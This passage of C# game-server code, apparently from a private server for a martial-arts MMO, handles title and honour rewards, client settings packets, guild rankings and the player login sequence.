					TimeSpan timeSpan = d - now;
					药品新效果(1008002376, 1, 药品.时间, (int)timeSpan.TotalMinutes);
					break;
				}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "set武勋物品出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 激活斗神称号(byte[] data, int length)
		{
			封包修改(data, length);
			try
			{
				称号药品类 value;
				if (!称号药品.TryGetValue(1008001479, out value) && !称号药品.TryGetValue(1008001478, out value))
				{
					if (data[10] == 90 && base.Player_ExpErience >= 200000000)
					{
						Config.武勋开关 = 8;
						if (!称号药品.ContainsKey(1008001479))
						{
							DateTime d = DateTime.Now.AddDays(30.0);
							DateTime now = DateTime.Now;
							double num = Convert.ToDouble(d.ToString("yyMMddHHmm"));
							TimeSpan timeSpan = d - now;
							称号药品类 称号药品类 = new 称号药品类();
							称号药品类.药品ID = 1008001479;
							称号药品类.时间 = (int)num;
							称号药品.Add(称号药品类.药品ID, 称号药品类);
							药品新效果(1008001479, 1, 称号药品类.时间, (int)timeSpan.TotalMinutes);
							药品追加对怪攻击 = 150;
							药品追加对怪防御 = 200;
							FLD_药品_追加_气功 = 2;
							Config.武勋开关 = 8;
							base.Player_ExpErience -= 200000000;
							更新经验和历练();
							RxjhClass.药品记录(base.Userid, base.UserName, 1008001479, "激活斗神称号", 1);
						}
						更新武功和状态();
						更新广播人物数据();
						更新装备效果();
					}
					else
					{
						Config.武勋开关 = 0;
						系统提示("激活斗神称号失败,当前历练值小于2亿。");
					}
				}
				else
				{
					新吃药提示();
				}
			}
			catch
			{
			}
		}

		public void 换线更新配置(byte[] 封包数据, int 封包大小)
		{
			封包修改(封包数据, 封包大小);
			PacketReader packetReader = new PacketReader(封包数据, 封包大小, false);
			packetReader.Seek(10, SeekOrigin.Begin);
			if (封包大小 != 26)
			{
				系统提示("本江湖使用19.0版本，请到主页下载最新补丁更新,不更新，有个别功能无法使用", 9, "系统提示");
			}
			Config.组队 = packetReader.ReadInt8();
			Config.交易 = packetReader.ReadInt8();
			Config.传音 = packetReader.ReadInt8();
			packetReader.ReadInt8();
			int 原著衣服 = Config.原著衣服;
			Config.原著衣服 = packetReader.ReadInt8();
			Config.查装备 = packetReader.ReadInt8();
			int 头发开关 = Config.头发开关;
			Config.头发开关 = packetReader.ReadInt8();
			int 武勋开关 = Config.武勋开关;
			Config.武勋开关 = packetReader.ReadInt8();
			if (Config.武勋开关 == 2 && (double)base.Player_WuXun > World.Wxlever[7] + 50000.0 && base.Player_WuXun >= 1500000 && base.武勋阶段 == 7 && base.Player_Zx != 0)
			{
				DateTime d = DateTime.Now.AddDays(30.0);
				DateTime now = DateTime.Now;
				double num = Convert.ToDouble(d.ToString("yyMMddHHmm"));
				TimeSpan timeSpan = d - now;
				称号药品类 称号药品类 = new 称号药品类
				{
					时间 = (int)num
				};
				base.Player_WuXun -= 50000;
				if (base.Player_Zx == 1)
				{
					称号药品类.药品ID = 1008001042;
					药品新效果(1008001042, 1, 称号药品类.时间, (int)timeSpan.TotalMinutes);
				}
				else
				{
					称号药品类.药品ID = 1008001043;
					药品新效果(1008001043, 1, 称号药品类.时间, (int)timeSpan.TotalMinutes);
				}
				称号药品.Add(称号药品类.药品ID, 称号药品类);
				World.发送全服武勋称号获得消息(base.UserName, base.Player_Zx);
			}
			Config.搜索开关 = packetReader.ReadInt8();
			Config.告白开关 = packetReader.ReadInt8();
			int 蔬菜武器开关 = Config.蔬菜武器开关;
			Config.蔬菜武器开关 = packetReader.ReadInt8();
			packetReader.ReadInt8();
			Config.宠物经验 = packetReader.ReadInt8();
			更新人物数据(this);
			更新装备效果to(this, this);
			if (原著衣服 != Config.原著衣服 || 蔬菜武器开关 != Config.蔬菜武器开关 || 头发开关 != Config.头发开关 || 武勋开关 != Config.武勋开关)
			{
				更新武功和状态();
				更新广播人物数据();
				更新装备效果();
			}
			服务器时间();
			客户端设置 = Converter.ToString(封包数据);
		}

		public void 更新配置(byte[] 封包数据, int 封包大小)
		{
			封包修改(封包数据, 封包大小);
			PacketReader packetReader = new PacketReader(封包数据, 封包大小, false);
			packetReader.Seek(10, SeekOrigin.Begin);
			if (封包大小 != 26)
			{
				系统提示("本江湖使用19.0版本，请到主页下载最新补丁更新,不更新，有个别功能无法使用", 9, "系统提示");
			}
			Config.组队 = packetReader.ReadInt8();
			Config.交易 = packetReader.ReadInt8();
			Config.传音 = packetReader.ReadInt8();
			packetReader.ReadInt8();
			int 原著衣服 = Config.原著衣服;
			Config.原著衣服 = packetReader.ReadInt8();
			Config.查装备 = packetReader.ReadInt8();
			int 头发开关 = Config.头发开关;
			Config.头发开关 = packetReader.ReadInt8();
			int 武勋开关 = Config.武勋开关;
			Config.武勋开关 = packetReader.ReadInt8();
			if (Config.武勋开关 == 2 && (double)base.Player_WuXun > World.Wxlever[7] + 50000.0 && base.Player_WuXun >= 1500000 && base.武勋阶段 == 7 && base.Player_Zx != 0)
			{
				DateTime d = DateTime.Now.AddDays(30.0);
				DateTime now = DateTime.Now;
				double num = Convert.ToDouble(d.ToString("yyMMddHHmm"));
				TimeSpan timeSpan = d - now;
				称号药品类 称号药品类 = new 称号药品类
				{
					时间 = (int)num
				};
				base.Player_WuXun -= 50000;
				if (base.Player_Zx == 1)
				{
					称号药品类.药品ID = 1008001042;
					药品新效果(1008001042, 1, 称号药品类.时间, (int)timeSpan.TotalMinutes);
				}
				else
				{
					称号药品类.药品ID = 1008001043;
					药品新效果(1008001043, 1, 称号药品类.时间, (int)timeSpan.TotalMinutes);
				}
				称号药品.Add(称号药品类.药品ID, 称号药品类);
				World.发送全服武勋称号获得消息(base.UserName, base.Player_Zx);
			}
			else if (Config.武勋开关 == 3 && (double)base.Player_WuXun > World.Wxlever[8] + 50000.0 && base.Player_WuXun >= 5500000 && base.武勋阶段 == 7 && base.Player_Zx != 0)
			{
				DateTime d2 = DateTime.Now.AddDays(30.0);
				DateTime now2 = DateTime.Now;
				double num2 = Convert.ToDouble(d2.ToString("yyMMddHHmm"));
				TimeSpan timeSpan2 = d2 - now2;
				称号药品类 称号药品类2 = new 称号药品类
				{
					时间 = (int)num2
				};
				base.Player_WuXun -= 150000;
				if (base.Player_Zx == 1)
				{
					称号药品类2.药品ID = 1008002376;
					药品新效果(1008002376, 1, 称号药品类2.时间, (int)timeSpan2.TotalMinutes);
				}
				else
				{
					称号药品类2.药品ID = 1008002377;
					药品新效果(1008002377, 1, 称号药品类2.时间, (int)timeSpan2.TotalMinutes);
				}
				称号药品.Add(称号药品类2.药品ID, 称号药品类2);
				World.发送全服大武圣称号获得消息(base.UserName, base.Player_Zx);
			}
			Config.搜索开关 = packetReader.ReadInt8();
			Config.告白开关 = packetReader.ReadInt8();
			int 蔬菜武器开关 = Config.蔬菜武器开关;
			Config.蔬菜武器开关 = packetReader.ReadInt8();
			packetReader.ReadInt8();
			Config.宠物经验 = packetReader.ReadInt8();
			更新人物数据(this);
			更新装备效果to(this, this);
			if (原著衣服 != Config.原著衣服 || 蔬菜武器开关 != Config.蔬菜武器开关 || 头发开关 != Config.头发开关 || 武勋开关 != Config.武勋开关)
			{
				更新武功和状态();
				更新广播人物数据();
				更新装备效果();
				更新气功();
			}
			服务器时间();
		}

		public void 加载门派成员()
		{
			DataTable dBToDataTable = DBA.GetDBToDataTable(string.Format("SELECT  *  FROM  TBL_XWWL_GuildMember"), "GameServer");
			if (dBToDataTable == null)
			{
				return;
			}
			if (dBToDataTable.Rows.Count != 0)
			{
				World.门派成员list.Clear();
				for (int i = 0; i < dBToDataTable.Rows.Count; i++)
				{
					门派成员 门派成员 = new 门派成员
					{
						ID = (int)dBToDataTable.Rows[i]["ID"],
						NAME = dBToDataTable.Rows[i]["FLD_NAME"].ToString(),
						GNAME = dBToDataTable.Rows[i]["G_Name"].ToString()
					};
					World.门派成员list.Add(门派成员.ID, 门派成员);
				}
			}
			dBToDataTable.Dispose();
		}

		public void 获取称号类型(int 物品id, int 开关)
		{
			发包类 发包类 = new 发包类();
			发包类.Write4(0);
			发包类.Write4(0);
			发包类.Write4(物品id);
			发包类.Write4(0);
			发包类.Write2(0);
			发包类.Write2(1);
			double num = Convert.ToDouble(DateTime.Now.AddDays(30.0).ToString("yyMMddHHmm"));
			double num2 = Convert.ToDouble(DateTime.Now.ToString("yyMMddHHmm"));
			if (开关 != 0)
			{
				发包类.Write4((int)num);
			}
			else
			{
				发包类.Write4(0);
			}
			发包类.Write2(开关);
			发包类.Write2(0);
			if (开关 != 0)
			{
				发包类.Write4((int)num2);
			}
			else
			{
				发包类.Write4(0);
			}
			发包类.Write4(0);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 17153, base.人物全服ID);
			}
		}

		public void 更新荣誉(byte[] 封包数据, int 封包大小)
		{
			int num = BitConverter.ToInt32(封包数据, 14);
			if (BitConverter.ToInt32(封包数据, 10) == 3)
			{
				加载门派成员();
				switch (num)
				{
				default:
					foreach (门派成员 value in World.门派成员list.Values)
					{
						Players players4 = 得到人物数据(value.NAME);
						if (players4 != null)
						{
							players4.门派称号类型 = 0;
							players4.更新人物数据(players4);
							players4.更新广播人物数据();
						}
					}
					break;
				case 1008001322:
					foreach (门派成员 value2 in World.门派成员list.Values)
					{
						Players players3 = 得到人物数据(value2.NAME);
						if (players3 != null)
						{
							players3.门派称号类型 = 6101;
							players3.获取称号类型(1008001322, 1);
							players3.更新人物数据(players3);
							players3.更新广播人物数据();
						}
					}
					break;
				case 1008001323:
					foreach (门派成员 value3 in World.门派成员list.Values)
					{
						Players players2 = 得到人物数据(value3.NAME);
						if (players2 != null)
						{
							players2.门派称号类型 = 6001;
							players2.获取称号类型(1008001323, 1);
							players2.更新人物数据(players2);
							players2.更新广播人物数据();
						}
					}
					break;
				case 1008001324:
					foreach (门派成员 value4 in World.门派成员list.Values)
					{
						Players players = 得到人物数据(value4.NAME);
						if (players != null)
						{
							players.门派称号类型 = 5901;
							players.获取称号类型(1008001324, 1);
							players.更新人物数据(players);
							players.更新广播人物数据();
						}
					}
					break;
				}
				return;
			}
			int num2 = 1008001049;
			int num3 = 1008001049;
			int num4 = 1008001099;
			int num5 = 1008001099;
			if (num.ToString().Contains("100800120"))
			{
				num5 = 1008001199;
			}
			else if (num.ToString().Contains("100800121"))
			{
				num5 = 1008001209;
			}
			else if (num.ToString().Contains("100800122"))
			{
				num5 = 1008001219;
			}
			else if (num.ToString().Contains("100800123"))
			{
				num5 = 1008001229;
			}
			else if (num.ToString().Contains("100800124"))
			{
				num5 = 1008001239;
			}
			if (num.ToString().Contains("100800125"))
			{
				num3 = 1008001239;
			}
			else if (num.ToString().Contains("100800126"))
			{
				num3 = 1008001249;
			}
			else if (num.ToString().Contains("100800127"))
			{
				num3 = 1008001259;
			}
			else if (num.ToString().Contains("100800128"))
			{
				num3 = 1008001269;
			}
			else if (num.ToString().Contains("100800129"))
			{
				num3 = 1008001279;
			}
			if (!num.ToString().Contains("100800120") && !num.ToString().Contains("100800121") && !num.ToString().Contains("100800122") && !num.ToString().Contains("100800123") && !num.ToString().Contains("100800124"))
			{
				if (!num.ToString().Contains("100800125") && !num.ToString().Contains("100800126") && !num.ToString().Contains("100800127") && !num.ToString().Contains("100800128") && !num.ToString().Contains("100800129"))
				{
					switch (num)
					{
					default:
						base.FLD_荣誉ID = 0;
						称号排名 = 0;
						break;
					case 1008001567:
						base.FLD_荣誉ID = 601;
						break;
					case 1008001568:
						base.FLD_荣誉ID = 602;
						break;
					case 1008001569:
						base.FLD_荣誉ID = 603;
						break;
					case 1008001570:
						base.FLD_荣誉ID = 604;
						break;
					case 1008001571:
						base.FLD_荣誉ID = 605;
						break;
					case 1008001395:
						base.FLD_荣誉ID = 461;
						break;
					case 1008001396:
						base.FLD_荣誉ID = 462;
						break;
					case 1008001397:
						base.FLD_荣誉ID = 463;
						break;
					case 1008001398:
						base.FLD_荣誉ID = 464;
						break;
					case 1008001399:
						base.FLD_荣誉ID = 465;
						break;
					}
				}
				else
				{
					base.FLD_荣誉ID = num - num2;
					称号排名 = num - num3;
				}
			}
			else
			{
				base.FLD_荣誉ID = num - num4;
				称号排名 = num - num5;
			}
			更新人物数据(this);
			更新广播人物数据();
			更新HP_MP_SP();
			更新武功和状态();
		}

		public void 发送已完成任务数据()
		{
			byte[] array = Converter.hexStringToByte("AA55E2072D018B00D407E8030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			int num = 0;
			foreach (int value in 已完成任务.Values)
			{
				System.Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array, 10 + num * 2, 2);
				num++;
			}
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 登记玉连环()
		{
			byte[] array = Converter.hexStringToByte("AA5532002C01C600240002000000E5EA0D0031BD0D0031BD0D0031BD0D00E6EA0D0031BD0D0031BD0D0031BD0D0000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			玉连环.Clear();
			for (int i = 0; i < 6; i++)
			{
				玉连环.Add(900401);
			}
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 新系统提示(int ID1, int ID2, string 名字1, string 名字2)
		{
			using (发包类 发包类 = new 发包类())
			{
				发包类.Write4(ID1);
				发包类.Write4(ID2);
				发包类.WriteName(名字1);
				发包类.Write4(0);
				发包类.Write2(0);
				发包类.WriteName("");
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 45080, base.人物全服ID);
				}
			}
		}

		public void 门派荣誉称号()
		{
			if (World.门派排名数据.Count == 0)
			{
				return;
			}
			for (int i = 0; i < World.门派排名数据.Count; i++)
			{
				if (i == 0 && World.门派排名数据[i] != null && World.门派排名数据[i].门派帮派名 == base.帮派名字)
				{
					if (base.帮派人物等级 == 6)
					{
						foreach (Players value in World.allConnectedChars.Values)
						{
							value.新系统提示(1, 4582, base.UserName, base.UserName);
						}
						新系统提示(3, 4582, base.UserName, base.UserName);
					}
					获取称号类型(1008001322, 1);
					获取称号类型(1008001323, 0);
					获取称号类型(1008001324, 0);
					门派称号类型 = 6101;
					base.门派称号追加攻击 = int.Parse(World.门派第一称号奖励[0]);
					base.门派称号追加防御 = int.Parse(World.门派第一称号奖励[1]);
					base.门派称号追加HP = int.Parse(World.门派第一称号奖励[2]);
					系统提示("奖励攻击" + int.Parse(World.门派第一称号奖励[0]) + ",防御" + int.Parse(World.门派第一称号奖励[1]) + ",血" + int.Parse(World.门派第一称号奖励[2]), 9, "门派称号BUFF");
				}
				if (i == 1 && World.门派排名数据[i] != null && World.门派排名数据[i].门派帮派名 == base.帮派名字)
				{
					if (base.帮派人物等级 == 6)
					{
						foreach (Players value2 in World.allConnectedChars.Values)
						{
							value2.新系统提示(1, 4583, base.UserName, base.UserName);
						}
						新系统提示(3, 4583, base.UserName, base.UserName);
					}
					获取称号类型(1008001322, 0);
					获取称号类型(1008001323, 1);
					获取称号类型(1008001324, 0);
					门派称号类型 = 6001;
					base.门派称号追加攻击 = int.Parse(World.门派第二称号奖励[0]);
					base.门派称号追加防御 = int.Parse(World.门派第二称号奖励[1]);
					base.门派称号追加HP = int.Parse(World.门派第二称号奖励[2]);
					系统提示("奖励攻击" + int.Parse(World.门派第二称号奖励[0]) + ",防御" + int.Parse(World.门派第二称号奖励[1]) + ",血" + int.Parse(World.门派第二称号奖励[2]), 9, "门派称号BUFF");
				}
				if (i == 2 && World.门派排名数据[i] != null && World.门派排名数据[i].门派帮派名 == base.帮派名字)
				{
					if (base.帮派人物等级 == 6)
					{
						foreach (Players value3 in World.allConnectedChars.Values)
						{
							value3.新系统提示(1, 4584, base.UserName, base.UserName);
						}
						新系统提示(3, 4584, base.UserName, base.UserName);
					}
					获取称号类型(1008001322, 0);
					获取称号类型(1008001323, 0);
					获取称号类型(1008001324, 1);
					门派称号类型 = 5901;
					base.门派称号追加攻击 = int.Parse(World.门派第三称号奖励[0]);
					base.门派称号追加防御 = int.Parse(World.门派第三称号奖励[1]);
					base.门派称号追加HP = int.Parse(World.门派第三称号奖励[2]);
					系统提示("奖励攻击" + int.Parse(World.门派第三称号奖励[0]) + ",防御" + int.Parse(World.门派第三称号奖励[1]) + ",血" + int.Parse(World.门派第三称号奖励[2]), 9, "门派称号BUFF");
				}
			}
		}

		public void 获得玫瑰称号属性()
		{
			DataTable dBToDataTable = DBA.GetDBToDataTable(string.Format("SELECT  top  5  *  FROM  TBL_XWWL_RoseTop  where  FLD_SEX  =  {0}  and  FLD_ZX={1}  Order  By  FLD_INNUM  Desc", base.Player_Sex, base.Player_Zx));
			if (dBToDataTable == null)
			{
				return;
			}
			if (dBToDataTable.Rows.Count > 0)
			{
				for (int i = 0; i < dBToDataTable.Rows.Count; i++)
				{
					if (dBToDataTable.Rows[i]["FLD_NAME"].ToString() == base.UserName)
					{
						switch (i)
						{
						case 0:
							base.玫瑰称号追加攻击 = int.Parse(World.玫瑰第一名奖励[1]);
							base.玫瑰称号追加防御 = int.Parse(World.玫瑰第一名奖励[2]);
							base.玫瑰称号追加HP = int.Parse(World.玫瑰第一名奖励[3]);
							base.FLD_荣誉ID = 461;
							获取称号类型(1008001395, 1);
							break;
						case 1:
							base.玫瑰称号追加攻击 = int.Parse(World.玫瑰第二名奖励[1]);
							base.玫瑰称号追加防御 = int.Parse(World.玫瑰第二名奖励[2]);
							base.玫瑰称号追加HP = int.Parse(World.玫瑰第二名奖励[3]);
							base.FLD_荣誉ID = 462;
							获取称号类型(1008001396, 1);
							break;
						case 2:
							base.玫瑰称号追加攻击 = int.Parse(World.玫瑰第三名奖励[1]);
							base.玫瑰称号追加防御 = int.Parse(World.玫瑰第三名奖励[2]);
							base.玫瑰称号追加HP = int.Parse(World.玫瑰第三名奖励[3]);
							base.FLD_荣誉ID = 463;
							获取称号类型(1008001397, 1);
							break;
						case 3:
							base.玫瑰称号追加攻击 = int.Parse(World.玫瑰第四名奖励[1]);
							base.玫瑰称号追加防御 = int.Parse(World.玫瑰第四名奖励[2]);
							base.玫瑰称号追加HP = int.Parse(World.玫瑰第四名奖励[3]);
							base.FLD_荣誉ID = 464;
							获取称号类型(1008001398, 1);
							break;
						case 4:
							base.玫瑰称号追加攻击 = int.Parse(World.玫瑰第五名奖励[1]);
							base.玫瑰称号追加防御 = int.Parse(World.玫瑰第五名奖励[2]);
							base.玫瑰称号追加HP = int.Parse(World.玫瑰第五名奖励[3]);
							base.FLD_荣誉ID = 465;
							获取称号类型(1008001399, 1);
							break;
						}
					}
				}
			}
			dBToDataTable.Dispose();
		}

		public void 人物登陆(byte[] 封包数据, int 封包大小)
		{
			封包修改(封包数据, 封包大小);
			int num = 0;
			if (base.Client != null && !base.Client.登陆)
			{
				if (base.Client != null)
				{
					base.Client.Dispose();
				}
			}
			else
			{
				try
				{
					Players value;
					if (World.allConnectedChars.TryGetValue(base.人物全服ID, out value))
					{
						封号(72, base.Userid, "非法修改封包封号_人物登陆1");
					}
					else if (人物是否登陆)
					{
						封号(72, base.Userid, "非法修改封包封号_人物登陆2");
					}
					else
					{
						人物是否登陆 = true;
						num = 1;
						string value2;
						if (!allChars.TryGetValue(封包数据[10], out value2))
						{
							if (base.Client != null)
							{
								base.Client.Dispose();
							}
						}
						else
						{
							num = 2;
							base.UserName = value2;
							if (base.UserName.Length == 0)
							{
								base.Client.Dispose();
							}
							if (base.UserName.Length > 14)
							{
								Form1.WriteLine(99, "非法人物名[" + base.Userid + "][" + base.UserName + "]      [" + base.Client.ToString() + "]");
								base.Client.Dispose();
							}
							num = 3;
							读出人物数据();
							门派荣誉称号();
							获得玫瑰称号属性();
							if (称号积分 >= int.Parse(World.至高无上称号奖励[0]))
							{
								base.称号追加攻击 = int.Parse(World.至高无上称号奖励[1]);
								base.称号追加防御 = int.Parse(World.至高无上称号奖励[2]);
								base.称号追加HP = int.Parse(World.至高无上称号奖励[3]);
								base.FLD_荣誉ID = 601;
								获取称号类型(1008001567, 1);
							}
							else if (称号积分 >= int.Parse(World.举世无双称号奖励[0]))
							{
								base.称号追加攻击 = int.Parse(World.举世无双称号奖励[1]);
								base.称号追加防御 = int.Parse(World.举世无双称号奖励[2]);
								base.称号追加HP = int.Parse(World.举世无双称号奖励[3]);
								base.FLD_荣誉ID = 602;
								获取称号类型(1008001568, 1);
							}
							else if (称号积分 >= int.Parse(World.雄霸天下称号奖励[0]))
							{
								base.称号追加攻击 = int.Parse(World.雄霸天下称号奖励[1]);
								base.称号追加防御 = int.Parse(World.雄霸天下称号奖励[2]);
								base.称号追加HP = int.Parse(World.雄霸天下称号奖励[3]);
								base.FLD_荣誉ID = 603;
								获取称号类型(1008001569, 1);
							}
							else if (称号积分 >= int.Parse(World.孤胆英雄称号奖励[0]))
							{
								base.称号追加攻击 = int.Parse(World.孤胆英雄称号奖励[1]);
								base.称号追加防御 = int.Parse(World.孤胆英雄称号奖励[2]);
								base.称号追加HP = int.Parse(World.孤胆英雄称号奖励[3]);
								base.FLD_荣誉ID = 604;
								获取称号类型(1008001570, 1);
							}
							else if (称号积分 >= int.Parse(World.英雄豪杰称号奖励[0]))
							{
								base.称号追加攻击 = int.Parse(World.英雄豪杰称号奖励[1]);
								base.称号追加防御 = int.Parse(World.英雄豪杰称号奖励[2]);
								base.称号追加HP = int.Parse(World.英雄豪杰称号奖励[3]);
								base.FLD_荣誉ID = 605;
								获取称号类型(1008001571, 1);
							}
							num = 7;
							服务器时间();
							num = 8;
							num = 11;
							检测走跑();
							num = 12;
							初始化气功();
							num = 13;
							初始化装备篮包裹();
							num = 130;
							初始化行囊凝神珠包裹();
							num = 1300;
							if (是否携带披风行囊)
							{
								初始化披风行囊();
							}
							num = 14;
							发送任务物品列表();
							num = 15;
							初始化已装备物品();
							num = 16;
							num = 17;
							Set个人药品();
							num = 18;
							更新金钱和负重();
							num = 19;
							灵兽数();
							num = 20;
							num = 23;
							set公有物品();
							set时间物品();
							set称号物品();
							num = 24;
							Set追加状态物品();
							num = 25;
							计算人物装备数据();
							num = 26;
							num = 28;
							更新人物任务2(0);
							num = 29;
							发送已完成任务数据();
							num = 290;
							发送土灵符数据();
							num = 30;
							if (Logoin())
							{
								上线 = true;
								num = 31;
								更新制作系统();
								num = 32;
								num = 33;
								获取复查范围Npc();
								num = 34;
								获取复查范围玩家();
								num = 35;
								获取复查范围地面物品();
								num = 36;
								if (base.帮派Id != 0)
								{
									查帮派();
								}
								num = 37;
								初始化职业技能();
								num = 47;
								if (师傅数据.TID != -1)
								{
									徒弟更新师徒系统();
								}
								else
								{
									for (int i = 0; i < 3; i++)
									{
										if (徒弟数据[i].TID != -1)
										{
											师傅更新师徒系统(i);
										}
										计算师徒属性(i);
									}
								}
								更新荣誉();
								num = 48;
								进入游戏发送传书(string.Format(World.进入传书内容, base.UserName), base.UserName, World.进入传书发送人);
								有新传书提示(2, 0);
								num = 49;
								查看传书();
								num = 54;
								结婚BUFF();
								num = 55;
								系统公告(World.进入公告);
								num = 56;
								更新移动速度();
								num = 50;
								其他();
								num = 51;
								更新人物数据(this);
								num = 52;
								更新武功和状态();
								num = 53;
								更新HP_MP_SP();
								num = 54;
								新手上线();
								num = 71;
								更新经验和历练();
								num = 72;
								检查地图();
								num = 73;
								检测婚姻状态();
								num = 74;
								更新武功冷却();
								num = 75;
								加载攻城数据();
								SerList.Clear();
								Connect conn = World.conn;
								string string_ = "获取服务器列表|" + base.Userid + "|" + base.原服务器序号 + "|" + base.原服务器IP + "|" + base.原服务器端口 + "|" + base.原服务器ID;
								conn.发送(string_);
								人物是否登陆 = true;
								判断是否用封包登陆 = 1;
								foreach (攻城数据 value3 in World.攻城数据list.Values)
								{
									DataTable dBToDataTable = DBA.GetDBToDataTable(string.Format("select  *  from  [攻城城主]  "));
									系统提示("天魔神宫已经被门派《" + dBToDataTable.Rows[0]["攻城行会名"].ToString() + "》占领!", 10, "系统提示");
									if (value3.行会名字 == base.帮派名字 && DateTime.Now < value3.天魔攻城奖励时间)
									{
										if (!追加状态列表.ContainsKey(1008002169))
										{
											long ticks = value3.天魔攻城奖励时间.ToUniversalTime().Ticks;
											long ticks2 = DateTime.Now.ToUniversalTime().Ticks;
											long num2 = (ticks - ticks2) / 10000L;
											追加状态类 追加状态类 = new 追加状态类(this, num2, 1008002169.0, 1.0);
											追加状态列表.Add(追加状态类.FLD_PID, 追加状态类);
											状态效果(BitConverter.GetBytes(1008002169), 1, (int)num2);
										}
										系统提示("你的攻城奖励到期时间是:" + value3.天魔攻城奖励时间.ToString("yyyy年MM月dd日  hh时mm分"), 9, "系统提示");
									}
									else if (value3.行会名字 != base.帮派名字 && 追加状态列表.ContainsKey(1008002169))
									{
										追加状态列表[1008002169].时间结束事件();
									}
									dBToDataTable.Dispose();
								}
								num = 53;
								重置地图();
							}
							else if (base.Client != null)
							{
								Form1.WriteLine(100, "人物换线登陆出错");
								OpClient(1);
								base.Client.Dispose();
							}
						}
					}
				}
				catch (Exception ex)
				{
					Form1.WriteLine(100, "人物登陆出错2[" + base.Userid + "]-[" + base.UserName + "]      " + num + "      " + ex.Message);
					if (base.Client != null)
					{
						base.Client.Dispose();
					}
				}
			}
		}

		public void 检查地图()
		{
			if (base.人物坐标_地图 == 1201 || base.人物坐标_地图 == 7001 || base.人物坐标_地图 == 7301 || base.人物坐标_地图 == 42101 || base.人物坐标_地图 == 42002 || base.人物坐标_地图 == 30000 || base.人物坐标_地图 == 30100 || base.人物坐标_地图 == 30200 || base.人物坐标_地图 == 30300 || base.人物坐标_地图 == 32002 || base.人物坐标_地图 == 2301)
			{
				移动(420f, 1550f, 15f, 101);
			}
		}

		public void 其他()
		{
			try
			{
				if (base.FLD_VIP == 1)
				{
					if (DateTime.Now > base.FLD_VIPTIM)
					{
						系统提示("你的VIP时间已到期,请联系客服充值。");
						base.FLD_VIP = 0;
					}
					else
					{
						if (World.Vip上线公告 == 1)
						{
							World.发送公告(string.Format(World.Vip上线公告内容, base.UserName));
						}
						系统提示("尊贵的VIP用户你好，欢迎光临本江湖。");
						系统提示("你的VIP到期时间是:" + base.FLD_VIPTIM.ToString("yyyy年MM月dd日  hh时mm分"));
					}
				}
				else if (World.普通上线公告 == 1)
				{
					World.发送公告(string.Format(World.普通上线公告内容, base.UserName));
				}
				if (base.Player_Job >= 1 && base.Player_Job <= 13)
				{
					if (base.人物_HP <= 0)
					{
						移动(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
						base.人物_HP = base.人物最大_HP;
						base.Player死亡 = false;
					}
					if (base.FLD_情侣.Length != 0)
					{
						计算爱情度等级(base.FLD_情侣_爱情度);
						Players players = World.检查玩家name(base.FLD_情侣);
						if (players != null)
						{
							players.更新情侣系统(2, base.UserName, players.婚戒刻字, players.解除关系倒计时, DateTime.Now);
							players.情侣提示(1, players.UserName, base.UserName);
							更新情侣系统(2, players.UserName, 婚戒刻字, 解除关系倒计时, DateTime.Now);
							情侣提示(1, base.UserName, players.UserName);
						}
						else
						{
							更新情侣系统(1, base.FLD_情侣, 婚戒刻字, 解除关系倒计时, DateTime.Now);
						}
